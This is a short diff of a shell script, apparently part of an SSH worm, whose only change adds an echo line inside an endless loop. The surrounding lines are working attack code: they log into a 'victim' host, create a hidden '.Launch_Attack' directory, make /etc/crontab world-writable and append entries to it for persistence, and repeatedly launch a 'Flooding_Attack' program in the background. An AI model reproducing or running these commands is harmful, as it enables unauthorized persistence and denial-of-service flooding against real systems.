@@ -39,6 +39,7 @@ ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; mkdir -p $Hidde
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; chmod 777 /etc/crontab; echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab; cd "$Hidden2" && ./Flooding_Attack & > /dev/null 2>&1'
 
 while [ "1" == "1" ]; do
+	echo "qq"
 	ssh victim@"$IP_Address" 'cd "$Hidden2" && ./Flooding_Attack &  > /dev/null 2>&1'
 done
 
